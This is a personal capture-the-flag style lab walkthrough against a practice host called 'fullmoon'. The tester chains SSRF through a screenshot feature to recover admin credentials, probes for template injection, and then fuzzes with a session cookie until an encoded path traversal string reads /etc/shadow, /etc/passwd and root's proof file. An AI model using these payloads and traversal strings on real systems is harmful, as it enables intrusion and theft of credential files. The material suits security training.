testing at `http://fullmoon/demo` to see if able to hit my `kali machine`
![[Pasted image 20250225144144.png]]
was able to hit my `python3` server
![[Pasted image 20250225145546.png]]
the `URL` analyze now leads us to believe `SSRF`, going down `SSRF methodology`

`file;///etc/passwd` didnt work
![[Pasted image 20250225145950.png]]`localhost` isn't allowed
![[Pasted image 20250225152908.png]]
`http://00.0.0:80/admin` is allowed
![[Pasted image 20250225153009.png]]
doesn't show anything when hitting `analyze Now` but if we look in `BURP` we can see an interesting response with a new `endpoint` for screenshots
![[Pasted image 20250225153310.png]]
if we browse to this location we see an `admin login` `http://fullmoon/screenshots/fullmoon-demo-screenshots-13.png` which is just a screenshot
![[Pasted image 20250225153457.png]]
when searching the `URL` for some reason it doesn't pop into `BURP` going to have to use `FFUF`

```bash
wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 http://offsecwp:80/index.php?fpv=FUZZ
wfuzz -c -z file,/usr/share/seclists/Fuzzing/3-digits-000-999.txt --hc 404,301 http://fullmoon/screenshots/fullmoon-demo-screenshots-FUZZ.png


wfuzz -c -z file,/usr/share/seclists/Fuzzing/3-digits-000-999.txt --hc 404,301 http://fullmoon/screenshots/fullmoon-demo-screenshots-13.png
```

did an `intruder` sniper attack on `1-99` but didnt find anything, going to need to extend the list
![[Pasted image 20250225155039.png]]
`wfuzz` ended up working fine
```bash
wfuzz -z range,1-1000 http://fullmoon/screenshots/fullmoon-demo-screenshots-FUZZ.png                                                                                            
```
we can see that the `1,3,7` have less `chars` than the others making these stick out
![[Pasted image 20250227183531.png]]
after understanding the function of the `http://fullmoon/demo` endpoint we understand that we have the `capability` to take `screenshots`, this allows us to bypass `authentication` with the `SSRF` 

looking at the `1.png`
`http://0.0.0.0/screenshots/fullmoon-demo-screenshots-1.png`
![[Pasted image 20250227183821.png]]
making sure the `POST` request properly went through and can see the new path of our `screenshot`
![[Pasted image 20250227184027.png]]navigating to `http://fullmoon/screenshots/fullmoon-demo-screenshots-19.png` - nothing found here
![[Pasted image 20250227184107.png]]
taking an `screenshot` of the `7.png` `http://0.0.0.0/screenshots/fullmoon-demo-screenshots-7.png`

![[Pasted image 20250227184215.png]]
seeing that the new path of this image is `21.png` `/screenshots/fullmoon-demo-screenshots-21.png`
![[Pasted image 20250227184301.png]]
got credentials
`admin:fQ86z6TxMncXCzmv2NY5`
![[Pasted image 20250227184325.png]]
logging in at `http://fullmoon/login`

![[Pasted image 20250227184541.png]]
got `local.txt` `f791273bd4509b02929d6afa0c7debd5`
- can see this may be some sort of `SSTI`
![[Pasted image 20250227184916.png]]
able to navigate to `templates` tab after a couple tries also able to edit them
![[Pasted image 20250227185304.png]]
created a `Test` template to begin testing of `SSTI`, the goal is to identify which language is being utilized here

`{{7*7}}` - not twig
![[Pasted image 20250227185439.png]]
if we change the `Template`we can see if it worked or not - this one did not work
![[Pasted image 20250227185535.png]]
not `apache freemarker`
`${7*7}`
![[Pasted image 20250227185724.png]]
not `pug`
```bash
h1 Hello, #{SECRET_STRING}
input(type='hidden' name='admin' value='true')

if SECRET_STRING
  - secret = ['‚ù§Ô∏è','üòç', 'ü§ü']
  p The secrets are: 
  each val in secret
    p #{val}
else
  p No secret for you!
```
![[Pasted image 20250227185853.png]]
not `jinja`
```bash
{{ config }} #In these object you can find all the configured env variables


{% for key, value in config.items() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```
![[Pasted image 20250227185949.png]]

can see  `EJS` is being used
![[Pasted image 20250227191048.png]]
learned from `discord` that  the  `SSTI` is not the path forward, going to try to find `endpoints` that can be used for `LFI` however we need to  fuzz with the `admin` cookie

 `admin` cookie is valid - confirmed by `curl` testing
```bash
‚îå‚îÄ‚îÄ(rootüíÄgobots)-[28Feb2025 01:34:30]-[/usr/share/payloadsallthethings/File Inclusion/Intruders]
‚îî‚îÄ# curl -v -H "Cookie: connect.sid=s%3AnYWVJATTZXdKubEAjCeGZQ-yT2TrpMeV.DeLhuJ%2B%2FVwi6sVxfQ14UuhcaAsgRO1jZwFhA3%2BrOWpo" \
"http://fullmoon/screenshots/fullmoon-demo-screenshots-22.png"

* Host fullmoon:80 was resolved.
* IPv6: (none)
* IPv4: 192.168.239.128
*   Trying 192.168.239.128:80...
* Connected to fullmoon (192.168.239.128) port 80
> GET /screenshots/fullmoon-demo-screenshots-22.png HTTP/1.1
> Host: fullmoon
> User-Agent: curl/8.8.0
> Accept: */*
> Cookie: connect.sid=s%3AnYWVJATTZXdKubEAjCeGZQ-yT2TrpMeV.DeLhuJ%2B%2FVwi6sVxfQ14UuhcaAsgRO1jZwFhA3%2BrOWpo
> 
* Request completely sent off
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Access-Control-Allow-Origin: *
< Content-Type: image/png
< Content-Disposition: inline; filename="fullmoon-demo-screenshots-22.png"
< X-Content-Type-Options: nosniff
< Accept-Ranges: bytes
< Cache-Control: public, max-age=0
< Last-Modified: Fri, 28 Feb 2025 01:16:18 GMT
< ETag: W/"358d-1954a202f5f"
< Content-Length: 13709
< Date: Fri, 28 Feb 2025 01:34:58 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
* client returned ERROR on write of 5109 bytes
* Closing connection
```
the only endpoint that could lead to `LFI` after testing `http://fullmoon/screenshots/fullmoon-demo-screenshots-22.png`
![[Pasted image 20250227212326.png]]
`fuzz` command that worked to show `LFI` - note that for some reason seeing an `..png` does not show in burp so could not use `intruder` for this
```bash
‚îå‚îÄ‚îÄ(rootüíÄgobots)-[28Feb2025 01:41:24]-[/usr/share/payloadsallthethings/File Inclusion/Intruders]
‚îî‚îÄ# wfuzz -c --hh 404 -b "connect.sid=s%3AnYWVJATTZXdKubEAjCeGZQ-yT2TrpMeV.DeLhuJ%2B%2FVwi6sVxfQ14UuhcaAsgRO1jZwFhA3%2BrOWpo" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --sc 200,500 "http://fullmoon/screenshots/FUZZ"

000000021:   200        36 L     36 W       999 Ch      "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow"                                                                                                      
000000020:   200        36 L     52 W       1909 Ch     "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"  
```

![[Pasted image 20250227212427.png]]
since we know the `LFI` works, looking for `proof.txt` `http://fullmoon/screenshots/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Froot%2Fproof.txt`

![[Pasted image 20250227212512.png]]
and if we look in burp we see the results of the `/etc/passwd` 
![[Pasted image 20250227212549.png]]
and `proof`
![[Pasted image 20250227212605.png]]